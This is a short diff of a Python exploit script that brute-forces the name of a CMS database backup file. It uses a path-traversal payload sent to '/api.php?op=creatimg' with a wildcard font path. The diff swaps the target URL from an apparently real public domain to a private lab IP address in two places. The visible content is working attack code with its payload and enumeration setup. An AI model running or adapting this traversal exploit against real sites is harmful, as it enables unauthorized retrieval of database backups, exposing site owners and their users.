@@ -69,7 +69,7 @@ import itertools
 characters = "abcdefghjklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ_.-"
 backup_sql = ""
 payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
-url = "http://www.cqmxnt.com"
+url = "http://192.168.1.113"
 flag = 0
 for num in range(1,7):
     if flag:
@@ -114,7 +114,7 @@ import itertools
 characters = "abcdefghjklmnopqrstuvwxyz0123456789ABCDEFGHIGKLMNOPQRSTUVWXYZ_.-"
 backup_sql = ""
 payload = "/api.php?op=creatimg&txt=mochazz&font=/../../../../caches/bakup/default/{location}<<"
-url = "http://www.cqmxnt.com"
+url = "http://192.168.1.113"
 flag = 0
 for num in range(1,7):
     if flag:
